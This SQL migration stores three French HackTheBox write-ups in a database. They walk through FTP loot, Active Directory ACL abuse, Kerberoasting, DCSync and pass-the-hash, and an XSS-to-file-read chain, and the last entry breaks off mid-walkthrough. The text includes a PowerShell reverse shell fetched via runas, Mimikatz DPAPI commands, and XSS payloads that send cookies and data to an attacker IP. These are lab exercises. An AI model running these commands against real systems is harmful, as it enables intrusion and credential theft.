-- Migration to add writeups from .write-up directory
-- Generated on 2026-03-03T14:50:55.372Z

-- Writeup: HackTheBox: Access
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Access',
  'htb-access',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Linux</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

L''objectif de cette phase est d''identifier la surface d''attaque d''une machine Windows dont la configuration semble atypique pour cet OS (absence de ports SMB/RPC standards). L''attaque repose sur une chaîne d''extraction de données à partir de services mal sécurisés.

#### Énumération des Services (Scanning)

Je débute par un scan **Nmap** complet pour identifier les ports ouverts, suivi d''une énumération des services et des scripts par défaut.

```bash
# Scan rapide de tous les ports TCP
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.98

# Scan de version et scripts par défaut sur les ports identifiés
nmap -sC -sV -p 21,23,80 -oA nmap/scripts 10.10.10.98
```

**Résultats du scan :**
*   **Port 21 (FTP) :** Microsoft ftpd. L''accès **Anonymous FTP** est activé.
*   **Port 23 (Telnet) :** Microsoft Telnet Service.
*   **Port 80 (HTTP) :** Microsoft IIS 7.5.

L''absence des ports 135, 139 et 445 suggère une machine Windows durcie ou configurée pour un rôle spécifique (système de contrôle d''accès, comme le nom de la machine l''indique).

#### Exploration du vecteur HTTP

Le serveur web affiche une image statique. Un scan de répertoires avec **Gobuster** ne révèle aucun point d''entrée exploitable.

```bash
gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt
```

#### Extraction de données via FTP Anonymous

Le service **FTP** permet une connexion anonyme. J''explore l''arborescence et identifie deux répertoires : `Backups` et `Engineer`.

```bash
ftp 10.10.10.98
# Connexion en tant qu''utilisateur ''anonymous''
# Récupération des fichiers
get "Backups/backup.mdb"
get "Engineer/Access Control.zip"
```

Je récupère une base de données **Microsoft Access** (`.mdb`) et une archive **ZIP** protégée par mot de passe.

> **Schéma Mental : La Chaîne de Confiance**
> L''accès **Anonymous FTP** est le premier maillon. Il fournit des artefacts (DB et ZIP) qui, bien que protégés ou illisibles directement, contiennent les secrets nécessaires pour pivoter vers l''accès système. La logique est : **FTP -> MDB (Credentials) -> ZIP (PST) -> PST (Email) -> Telnet (Shell)**.

#### Analyse de la base de données (MDB)

Pour analyser le fichier `backup.mdb` sous Linux, j''utilise la suite **mdbtools**. L''objectif est d''énumérer les tables et d''extraire des informations d''authentification.

```bash
# Lister les tables de la base de données
mdb-tables backup.mdb

# Script rapide pour identifier les tables contenant des données
for table in $(mdb-tables backup.mdb); do 
    count=$(mdb-export backup.mdb $table | wc -l); 
    if [ $count -gt 1 ]; then echo "$table: $count"; fi; 
done
```

La table `auth_user` contient des informations critiques :

```bash
mdb-export backup.mdb auth_user
# Résultat :
# 27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
```

Le mot de passe identifié est **access4u@security**.

#### Pivot vers le fichier PST (Outlook)

L''archive `Access Control.zip` contient un fichier `Access Control.pst`. Je tente de la décompresser en utilisant le mot de passe trouvé précédemment.

```bash
7z x "Access Control.zip" -p''access4u@security''
```

Le fichier **PST** est un format de stockage d''emails Outlook. Pour le lire, je le convertis au format **mbox** (plain text) avec l''outil **readpst**.

```bash
# Conversion du PST
readpst "Access Control.pst"

# Lecture du fichier mbox résultant
cat "Access Control.mbox"
```

L''email extrait contient le message suivant :
*"The password for the “security” account has been changed to **4Cc3ssC0ntr0ller**."*

#### Accès Initial via Telnet

Avec les credentials de l''utilisateur `security`, je tente une connexion via le service **Telnet** identifié lors du scan initial.

```bash
telnet 10.10.10.98
# Login: security
# Password: 4Cc3ssC0ntr0ller
```

La connexion est réussie. Je dispose désormais d''un **Shell** interactif avec les privilèges de l''utilisateur `security`.

```cmd
C:\Users\security> whoami
access\security

C:\Users\security\Desktop> type user.txt
```

---

### Énumération Post-Exploitation & Découverte de Secrets

Une fois l''accès initial obtenu avec le compte **security**, l''objectif est d''identifier des vecteurs d''élévation de privilèges. Sur Windows, l''énumération des raccourcis (**LNK files**) et des informations d''identification stockées est cruciale.

L''examen du bureau public révèle un fichier suspect : `C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk`.

```powershell
# Lecture brute du fichier LNK pour identifier des commandes masquées
type "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk"
```

L''analyse des chaînes de caractères montre l''utilisation de **runas.exe** avec le flag `/savecred`. Cela indique que le mot de passe de l''administrateur a été enregistré précédemment dans le **Windows Credential Manager**.

Pour confirmer la présence de **Cached Credentials**, j''utilise la commande suivante :

```cmd
# Lister les informations d''identification enregistrées
cmdkey /list
```

> **Schéma Mental :** L''attaquant identifie une mauvaise configuration de **runas /savecred**. Si un administrateur a utilisé cette commande une fois, le système stocke le secret de manière persistante. Tout utilisateur ayant accès à la machine peut alors réutiliser ces **Stored Credentials** pour exécuter n''importe quel binaire avec les privilèges de l''administrateur sans connaître son mot de passe.

---

### Escalade de Privilèges : Méthode 1 (Abus de runas)

La méthode la plus directe consiste à invoquer un **Reverse Shell** via PowerShell en utilisant les privilèges mis en cache.

**Préparation de l''attaque (Machine Attaquant) :**
J''utilise le script `Invoke-PowerShellTcp.ps1` de la suite **Nishang**.

```bash
# Ajout de l''appel de fonction à la fin du script pour exécution automatique
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443" >> shell.ps1

# Lancement du serveur HTTP et du listener
python3 -m http.server 80
nc -lnvp 443
```

**Exécution (Machine Cible) :**
J''exécute la commande via **runas** pour déclencher le callback en tant qu''**Administrator**.

```cmd
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring(''http://10.10.14.11/shell.ps1'')"
```

---

### Escalade de Privilèges : Méthode 2 (Extraction DPAPI via Mimikatz)

Pour une approche plus furtive ou hors-ligne, il est possible d''extraire les secrets du **Credential Manager** protégés par **DPAPI (Data Protection API)**.

#### 1. Collecte des artefacts
Il faut récupérer le **Master Key** et le fichier de **Credentials**.

```cmd
# Localisation du Master Key (nom de dossier GUID)
dir /a C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-...

# Encodage en Base64 pour exfiltration simple via le terminal
certutil -encode <FILE> output.txt
```

#### 2. Déchiffrement avec Mimikatz
Une fois les fichiers rapatriés, j''utilise **Mimikatz** pour remonter la chaîne de confiance.

> **Schéma Mental :** DPAPI protège les secrets utilisateur. Le **Credential File** est chiffré par une **Master Key**, elle-même chiffrée par le mot de passe de l''utilisateur (ou son SID). En possédant le mot de passe de l''utilisateur actuel (`security`), on peut déverrouiller la **Master Key** pour lire les secrets d''autres comptes stockés sur le système.

```mimikatz
# 1. Déchiffrer la Master Key avec le mot de passe de l''utilisateur actuel
dpapi::masterkey /in:masterkey /sid:S-1-5-21-... /password:4Cc3ssC0ntr0ller

# 2. Déchiffrer le fichier de credentials pour obtenir le mot de passe clair
dpapi::cred /in:credentials
```

**Résultat :** L''extraction révèle le mot de passe de l''administrateur : `55Acc3ssS3cur1ty@megacorp`.

---

### Mouvement Latéral & Accès Final

Avec le mot de passe clair de l''**Administrator**, l''accès complet est validé via **Telnet**, permettant de récupérer le flag `root.txt`.

```bash
telnet 10.10.10.98
# Login: administrator
# Pass: 55Acc3ssS3cur1ty@megacorp

whoami
# access\administrator
```

### Analyse approfondie (Beyond Root) : Analyse de fichiers LNK
Pour automatiser l''analyse de raccourcis sans interface graphique, l''utilisation de **PowerShell COM Objects** est la méthode privilégiée en post-exploitation :

```powershell
$WScript = New-Object -ComObject WScript.Shell
$Lnk = Get-ChildItem C:\Users\Public\Desktop\*.lnk
$WScript.CreateShortcut($Lnk) | Select-Object TargetPath, Arguments, WorkingDirectory
```

---

### Énumération pour l''Élévation de Privilèges

Une fois le shell obtenu en tant que `access\security`, ma priorité est d''identifier des vecteurs de mouvement latéral ou d''escalade. Sur une machine Windows, l''un des premiers réflexes est de vérifier la présence de **Stored Credentials**.

L''exécution de la commande `cmdkey` révèle une information critique :

```cmd
cmdkey /list
```

Le résultat confirme que des **Cached Credentials** sont présents pour le compte `ACCESS\Administrator`. Parallèlement, l''examen du répertoire `C:\Users\Public\Desktop` montre un fichier **Shortcut** (`.lnk`) nommé `ZKAccess3.5 Security System.lnk`. L''analyse des chaînes de caractères de ce binaire via `type` expose la commande sous-jacente :

```cmd
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

> **Schéma Mental :** L''utilisation de **runas.exe** avec le flag **/savecred** indique que le mot de passe de l''administrateur a été enregistré dans le **Windows Credential Manager**. Contrairement à un `runas` classique, le système ne demandera pas de mot de passe à l''exécution car il utilisera le secret stocké dans le **LSA (Local Security Authority)**. En tant qu''utilisateur `security`, je peux invoquer n''importe quel binaire sous l''identité `Administrator` en détournant cet usage.

---

### Vecteur 1 : Exploitation directe via Runas & Reverse Shell

La méthode la plus rapide consiste à utiliser **runas** pour exécuter une instance **PowerShell** qui chargera un **Reverse Shell** en mémoire. J''utilise le script `Invoke-PowerShellTcp.ps1` de la suite **Nishang**.

1.  **Préparation sur la machine attaquante :**
    Ajout de l''appel de fonction à la fin du script et lancement d''un serveur HTTP.
    ```bash
    echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443" >> shell.ps1
    python3 -m http.server 80
    ```

2.  **Exécution sur la cible :**
    J''utilise `runas` pour forcer l''exécution du payload via les identifiants mis en cache.
    ```cmd
    runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring(''http://10.10.14.11/shell.ps1'')"
    ```

Une connexion entrante est reçue sur mon listener `nc -lnvp 443`, m''octroyant un shell avec les privilèges `access\administrator`.

---

### Vecteur 2 : Extraction des secrets via DPAPI (Méthode Avancée)

Si l''exécution directe n''était pas possible, j''aurais pu extraire physiquement les secrets via l''API **DPAPI (Data Protection API)**. Cette méthode permet de récupérer le mot de passe en clair stocké par Windows.

1.  **Récupération des fichiers nécessaires :**
    *   Le **Master Key** (situé dans `AppData\Roaming\Microsoft\Protect\{SID}`).
    *   Le fichier de **Credentials** (situé dans `AppData\Roaming\Microsoft\Credentials`).

2.  **Exfiltration et Décodage :**
    Utilisation de `certutil -encode` pour transférer les binaires en Base64 via le terminal Telnet.

3.  **Déchiffrement avec Mimikatz :**
    Sur une machine Windows de contrôle, j''utilise **Mimikatz** pour dériver la clé maître avec le mot de passe de l''utilisateur `security` (obtenu en Phase 2), puis je déchiffre le blob de credentials.

```mimikatz
# 1. Déchiffrer la Master Key
dpapi::masterkey /in:masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller

# 2. Déchiffrer le Credential Blob
dpapi::cred /in:credentials
```

Le champ `CredentialBlob` révèle le mot de passe en clair de l''administrateur : `55Acc3ssS3cur1ty@megacorp`.

---

### Domination Totale

Avec le mot de passe administrateur, la compromission est totale. Je peux me reconnecter via **Telnet** ou utiliser `psexec` pour une persistance accrue.

```bash
telnet 10.10.10.98
# Login: administrator / 55Acc3ssS3cur1ty@megacorp
type C:\Users\Administrator\Desktop\root.txt
```

---

### Beyond Root : Analyse Post-Exploitation des fichiers .lnk

L''analyse de fichiers **Shortcut** (`.lnk`) est souvent négligée mais cruciale pour comprendre les vecteurs d''attaque par **User Interaction** ou les mauvaises configurations de scripts d''administration.

**Analyse via PowerShell :**
Il est possible d''inspecter les propriétés d''un raccourci sans outils tiers en utilisant l''objet **COM** `WScript.Shell`. Cela permet d''extraire proprement les arguments de la ligne de commande, souvent tronqués lors d''un simple `type` ou `strings`.

```powershell
$WScript = New-Object -ComObject WScript.Shell
$Shortcut = $WScript.CreateShortcut("C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk")
$Shortcut | Select-Object FullName, TargetPath, Arguments, WorkingDirectory
```

**Analyse Offline via pylnker :**
Sur une machine Linux, l''outil **pylnker.py** permet de parser la structure binaire du fichier pour extraire des métadonnées supplémentaires comme les **MAC Times** (Creation, Access, Modified) et le **Volume Serial Number**, ce qui est précieux lors d''une investigation de type **Forensics** pour tracer l''origine d''un déploiement de logiciel ou d''un script malveillant.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['SMB', 'Web', 'Privilege Escalation'],
  'L''objectif de cette phase est d''identifier la surface d''attaque d''une machine Windows dont la configuration semble atypique pour cet OS (absence de ports SMB/RPC standards). L''attaque repose sur une chaîne d''extraction de données à partir de services...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-access-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Administrator
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Administrator',
  'htb-administrator',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Énumération et Scanning

L''objectif initial est d''identifier la surface d''attaque de la machine **Administrator**, un **Domain Controller** Windows. Je commence par un scan **Nmap** exhaustif pour découvrir les services ouverts.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.42

# Scan détaillé des services identifiés
nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.42
```

Le scan révèle une panoplie de services classiques d''un environnement **Active Directory** :
*   **DNS** (53), **Kerberos** (88), **LDAP** (389/636), **SMB** (445).
*   **WinRM** (5985) : Indique une possibilité de gestion à distance.
*   **FTP** (21) : Service inhabituel sur un **Domain Controller**, à investiguer.

Le nom de domaine identifié via le script **LDAP** est `administrator.htb`. Je mets à jour mon fichier `/etc/hosts` en utilisant **NetExec** pour automatiser la résolution.

```bash
netexec smb 10.10.11.42 --generate-hosts-file /etc/hosts
```

### Vecteur d''Entrée : Credentials Statiques

Dans ce scénario, des identifiants de bas niveau sont fournis : `olivia:ichliebedich`. Je valide ces accès sur les différents services pour déterminer mon point d''entrée.

```bash
# Validation SMB
netexec smb 10.10.11.42 -u olivia -p ichliebedich

# Validation WinRM (Accès privilégié à distance)
netexec winrm 10.10.11.42 -u olivia -p ichliebedich
```

Les tests confirment que l''utilisateur **olivia** a le droit de se connecter via **WinRM** (groupe **Remote Management Users**). Je procède à l''établissement d''un premier shell.

```bash
evil-winrm -i administrator.htb -u olivia -p ichliebedich
```

### Énumération Interne et Bloodhound

Une fois sur la machine, l''énumération locale (fichiers, `inetpub\ftproot`) ne donne rien d''exploitable immédiatement. Je bascule sur une énumération orientée **Active Directory** en utilisant **Bloodhound.py** pour cartographier les relations de confiance et les privilèges.

```bash
bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
```

L''analyse des données dans **Bloodhound** révèle une vulnérabilité critique : l''utilisateur **olivia** possède le privilège **GenericAll** sur l''utilisateur **michael**.

> **Schéma Mental : Abus de GenericAll**
> Le privilège **GenericAll** (Full Control) sur un objet utilisateur permet de modifier n''importe quel attribut de cet objet. Dans un contexte offensif, l''action la plus directe consiste à effectuer un **Password Reset** sur la cible. Contrairement à un changement de mot de passe classique, le privilège **GenericAll** permet de définir un nouveau mot de passe sans connaître l''ancien.

### Escalade de Privilèges : Accès à Michael

J''utilise l''outil `net` pour réinitialiser le mot de passe de **michael** depuis ma machine d''attaque, en utilisant les droits d''**olivia**.

```bash
# Réinitialisation du mot de passe de michael
net rpc password "michael" "P@ssw0rd123!" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```

Après avoir vérifié que le nouveau mot de passe est valide, je constate que **michael** fait également partie du groupe **Remote Management Users**, ce qui me permet d''obtenir un second shell avec une identité différente.

```bash
# Validation et connexion WinRM
netexec winrm 10.10.11.42 -u michael -p ''P@ssw0rd123!''
evil-winrm -i administrator.htb -u michael -p ''P@ssw0rd123!''
```

Cette transition marque la fin de la brèche initiale et le début de l''escalade latérale au sein du domaine.

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois l''accès initial obtenu avec les identifiants d''**Olivia**, ma priorité est de cartographier les relations de confiance au sein de l''**Active Directory**. N''ayant pas de vecteurs d''exploitation directe sur le système de fichiers, je me concentre sur l''énumération des objets du domaine.

#### 1. Énumération Active Directory (Bloodhound)

J''utilise **bloodhound-python** pour ingérer les données du domaine. Cette étape est cruciale pour identifier les chemins d''attaque non évidents basés sur les **Access Control Entries (ACEs)**.

```bash
# Collecte des données AD
bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
```

L''analyse des données révèle une chaîne de compromission par délégation de droits :
1. **Olivia** possède le droit **GenericAll** sur l''utilisateur **Michael**.
2. **Michael** possède le droit **ForceChangePassword** sur **Benjamin**.
3. **Benjamin** appartient au groupe **Share Moderators**, lui donnant accès au service **FTP**.

> **Schéma Mental : Chaîne d''Abus d''ACL**
> Olivia --[GenericAll]--> Michael --[ForceChangePassword]--> Benjamin --[MemberOf]--> Share Moderators (Accès FTP)

#### 2. Pivot : Michael & Benjamin (Abus de GenericAll)

Le droit **GenericAll** permet un contrôle total sur l''objet cible, y compris la modification de son mot de passe sans connaître l''ancien. J''utilise **net rpc** pour réinitialiser les mots de passe successivement.

```bash
# Reset du password de Michael via Olivia
net rpc password "michael" "P@ssw0rd123!" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42

# Reset du password de Benjamin via Michael
net rpc password "benjamin" "P@ssw0rd123!" -U "administrator.htb"/"michael"%"P@ssw0rd123!" -S 10.10.11.42
```

#### 3. Exfiltration de données : FTP & Password Safe

Avec les accès de **Benjamin**, je me connecte au serveur **FTP** pour inspecter les partages modérés. J''y trouve un fichier de base de données **Password Safe** (`Backup.psafe3`).

```bash
# Connexion FTP et récupération de la DB
ftp 10.10.11.42
get Backup.psafe3
```

Le fichier est protégé par une **Master Password**. Je tente un cassage hors-ligne avec **hashcat** en utilisant le mode spécifique pour **Password Safe v3**.

```bash
# Cracking de la base Password Safe
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

Le mot de passe `tekieromucho` permet d''ouvrir la base de données. J''y récupère les identifiants d''**Emily** : `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`.

#### 4. Mouvement Latéral : Emily vers Ethan (Targeted Kerberoasting)

L''énumération **Bloodhound** indique qu''**Emily** possède le droit **GenericWrite** sur l''utilisateur **Ethan**. Ce droit permet de modifier les attributs de l''objet, notamment le **Service Principal Name (SPN)**.

> **Schéma Mental : Targeted Kerberoasting**
> 1. L''attaquant possède **GenericWrite** sur un utilisateur (Ethan).
> 2. L''attaquant ajoute un **SPN** arbitraire à cet utilisateur.
> 3. L''utilisateur devient "Kerberoastable".
> 4. On demande un **TGS** pour ce service, chiffré avec le hash d''Ethan.
> 5. On cracke le hash hors-ligne pour obtenir le mot de passe d''Ethan.

J''utilise l''outil **targetedKerberoast.py** pour automatiser l''injection du **SPN** et la récupération du ticket.

```bash
# Exécution du Targeted Kerberoasting
python3 targetedKerberoast.py -v -d ''administrator.htb'' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Le hash récupéré est cassé avec **hashcat** (mode 13100), révélant le mot de passe d''**Ethan** : `limpbizkit`.

#### 5. Compromission Totale : Ethan vers Domain Admin (DCSync)

L''analyse finale des privilèges d''**Ethan** montre qu''il possède les droits **DS-Replication-Get-Changes** et **DS-Replication-Get-Changes-All**. Ces permissions permettent d''effectuer une attaque **DCSync** pour simuler un **Domain Controller** et demander la réplication des secrets du domaine.

```bash
# Extraction des hashes NTDS.dit via DCSync
secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

Je récupère le hash **NTLM** de l''**Administrator** du domaine : `3dc553ce4b9fd20bd016e098d2d2fd2e`.

> **Schéma Mental : DCSync Attack**
> Ethan (Privilèges de réplication) -> Demande de réplication au DC -> Le DC envoie les hashes de tous les utilisateurs (y compris l''Admin) -> Authentification via Pass-The-Hash.

#### 6. Accès Final

Il ne reste plus qu''à utiliser la technique **Pass-The-Hash** via **Evil-WinRM** pour obtenir un shell avec les privilèges les plus élevés sur le **Domain Controller**.

```bash
# Connexion finale en tant qu''Administrator
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Une fois l''accès obtenu en tant qu''**Emily**, l''analyse des données **Bloodhound** révèle un chemin critique vers la compromission totale du domaine. **Emily** possède le privilège **GenericWrite** sur l''utilisateur **Ethan**.

#### 1. Compromission d''Ethan : Targeted Kerberoasting

Le privilège **GenericWrite** sur un objet utilisateur permet de modifier ses attributs, notamment le **Service Principal Name (SPN)**. En injectant un **SPN** arbitraire sur le compte d''**Ethan**, je peux transformer ce compte standard en une cible de **Kerberoasting**.

> **Schéma Mental :**
> Emily (`GenericWrite`) ➔ Modification de l''attribut `servicePrincipalName` d''Ethan ➔ Requête **TGS** (Ticket Granting Service) ➔ Extraction du hash du ticket (chiffré avec le mot de passe d''Ethan) ➔ Crack hors-ligne.

J''utilise l''outil **targetedKerberoast.py** pour automatiser l''injection du **SPN**, la récupération du hash et le nettoyage (cleanup) de l''attribut :

```bash
# Synchronisation de l''heure avec le DC (crucial pour Kerberos)
sudo ntpdate administrator.htb

# Exécution de l''attaque ciblée
uv run targetedKerberoast.py -v -d ''administrator.htb'' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Le script extrait un hash `$krb5tgs$23$*ethan...`. Je procède au cracking avec **hashcat** et la wordlist **rockyou.txt** :

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

Le mot de passe identifié pour **Ethan** est : `limpbizkit`.

#### 2. Domination du Domaine : Attaque DCSync

L''analyse **Bloodhound** montre qu''**Ethan** dispose des privilèges **DS-Replication-Get-Changes** et **DS-Replication-Get-Changes-All** sur la racine du domaine. Ces droits permettent d''exécuter une attaque **DCSync**.

> **Schéma Mental :**
> Ethan (`DCSync` rights) ➔ Simulation d''un **Domain Controller** via le protocole **MS-DRSR** ➔ Requête de réplication des données sensibles ➔ Extraction des hashes NTLM depuis la base **NTDS.dit**.

J''utilise **secretsdump.py** d''**Impacket** pour dumper les hashes du domaine :

```bash
secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

L''outil retourne le hash NTLM du compte **Administrator** :
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::`

#### 3. Accès Final (Pass-the-Hash)

Avec le hash NTLM de l''administrateur du domaine, je peux m''authentifier sans avoir besoin de cracker le mot de passe via une attaque **Pass-the-Hash (PtH)** sur le service **WinRM**.

```bash
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Je suis désormais **Domain Admin**. Le flag `root.txt` se trouve dans `C:\Users\Administrator\Desktop`.

---

### Analyse Post-Exploitation : Beyond Root

La machine **Administrator** illustre une chaîne de compromission **Active Directory** complexe basée exclusivement sur des abus de privilèges d''objets (ACL/ACE).

1.  **La Chaîne de Confiance Brisée :** L''attaque a suivi un cheminement logique de pivotement horizontal et vertical :
    *   **Olivia** ➔ **Michael** (**GenericAll**) : Contrôle total du compte.
    *   **Michael** ➔ **Benjamin** (**ForceChangePassword**) : Réinitialisation arbitraire.
    *   **Benjamin** ➔ **Emily** (Accès **FTP** vers un **Password Safe**) : Récupération de secrets via un fichier tiers.
    *   **Emily** ➔ **Ethan** (**GenericWrite**) : Vecteur de **Targeted Kerberoasting**.
    *   **Ethan** ➔ **Domain Admin** (**DCSync**) : Compromission totale.

2.  **Vecteurs de Persistance :** En tant que **Domain Admin**, j''aurais pu générer un **Golden Ticket** via le hash du compte **krbtgt** récupéré lors du **DCSync**, garantissant un accès illimité même en cas de changement de mot de passe de l''administrateur.

3.  **Défense et Remédiation :**
    *   **Principe du Moindre Privilège :** Les droits **GenericWrite** et **DCSync** ne devraient jamais être attribués à des comptes d''utilisateurs standards.
    *   **Hygiène des Mots de Passe :** Le succès du **Kerberoasting** sur Ethan et du cracking du **Password Safe** repose sur l''utilisation de mots de passe présents dans des dictionnaires publics.
    *   **Surveillance :** L''utilisation de **DCSync** par un compte non-machine est une alerte critique qui doit être monitorée via les logs d''audit (Event ID 4662).',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Kerberos', 'Privilege Escalation'],
  'L''objectif initial est d''identifier la surface d''attaque de la machine **Administrator**, un **Domain Controller** Windows. Je commence par un scan **Nmap** exhaustif pour découvrir les services ouverts. Le scan révèle une panoplie de services classi...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-administrator-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Alert
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Alert',
  'htb-alert',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

# Phase 1 : Reconnaissance & Brèche Initiale

## Énumération Réseau et Services

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque externe.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 10.10.11.44 -oN all_ports.nmap

# Scan détaillé des services identifiés
nmap -p 22,80 -sCV 10.10.11.44 -oN targeted.nmap
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 8.2p1 (Ubuntu).
*   **Port 80 (HTTP) :** Apache 2.4.41. Redirection vers `http://alert.htb/`.
*   **Port 12227 :** État `filtered`.

L''analyse des versions suggère une distribution **Ubuntu 20.04 (Focal)**. J''ajoute l''entrée correspondante dans mon fichier `/etc/hosts`.

## Énumération Web et Sous-domaines

Le serveur Apache utilise le **Virtual Hosting**. Je procède à un fuzzing du header `Host` pour découvrir d''éventuels sous-domaines.

```bash
ffuf -u http://10.10.11.44 -H "Host: FUZZ.alert.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
```

Le scan révèle `statistics.alert.htb` qui retourne un code **401 Unauthorized** (Basic Authentication). Sans identifiants, je me concentre sur le domaine principal.

### Analyse de l''application `alert.htb`
L''application principale est un **Markdown Viewer** écrit en **PHP**. 
*   **Fonctionnalité :** L''utilisateur soumet du Markdown, et `visualizer.php` affiche le rendu HTML.
*   **Partage :** Un bouton "Share Markdown" génère un lien unique : `visualizer.php?link_share=[ID].md`.
*   **Interaction Admin :** La page "About Us" indique qu''un administrateur consulte les messages envoyés via le formulaire de contact pour corriger les erreurs de rendu.

## Identification du Vecteur : Cross-Site Scripting (XSS)

Puisque l''application convertit du Markdown en HTML, je teste si les balises HTML injectées sont interprétées.

```markdown
### Test XSS
<script>fetch(''http://10.10.14.6/log?c='' + document.cookie)</script>
```

En visualisant ce Markdown, le script s''exécute localement. Pour confirmer l''interaction avec l''administrateur, je soumets le lien de partage via le formulaire de contact.

> **Schéma Mental : Chaîne d''attaque XSS vers Arbitrary File Read**
> 1. **Attaquant** : Héberge un script malveillant ou injecte du code JS dans un fichier Markdown.
> 2. **Attaquant** : Envoie l''URL du fichier Markdown partagé à l''**Admin** via le formulaire de contact.
> 3. **Admin** : Consulte l''URL. Son navigateur exécute le JavaScript dans le contexte de `alert.htb`.
> 4. **JavaScript** : Effectue une requête `fetch()` vers une ressource interne (ex: `messages.php`) inaccessible depuis l''extérieur.
> 5. **JavaScript** : Exfiltre le contenu de la ressource vers le serveur de l''**Attaquant**.

## Exploitation : Arbitrary File Read & Directory Traversal

L''énumération par brute-force de répertoires avec `feroxbuster` a révélé un fichier `messages.php` qui semble vide ou restreint.

```bash
feroxbuster -u http://alert.htb -x php
```

Je suspecte que `messages.php` est accessible uniquement par l''administrateur (localhost/internal). J''utilise le **XSS** pour forcer l''admin à lire ce fichier et me le transmettre.

**Payload Markdown injecté :**
```html
<script>
fetch(''http://alert.htb/messages.php'')
.then(r => r.text())
.then(data => fetch(''http://10.10.14.6/exfil?d='' + btoa(data)));
</script>
```

Le contenu décodé de `messages.php` révèle une vulnérabilité de **Directory Traversal** via le paramètre `file` :
`messages.php?file=2024-03-10_15-48-34.txt`

En analysant le code source de `messages.php` (récupéré via le même vecteur XSS), je confirme l''utilisation de `file_get_contents()` sans filtrage adéquat sur le paramètre `file`.

## Extraction des Identifiants et Accès Initial

Je cible la configuration Apache pour localiser le fichier `.htpasswd` du sous-domaine `statistics`.

```bash
# Lecture de la configuration VirtualHost
python3 exploit_xss.py "/etc/apache2/sites-enabled/000-default.conf"
```

Le fichier de configuration indique : `AuthUserFile /var/www/statistics.alert.htb/.htpasswd`. Je récupère le hash via le **Path Traversal** relayé par le **XSS**.

```bash
# Récupération du hash
python3 exploit_xss.py "/var/www/statistics.alert.htb/.htpasswd"
```

**Hash obtenu :** `albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`

### Cracking de Hash
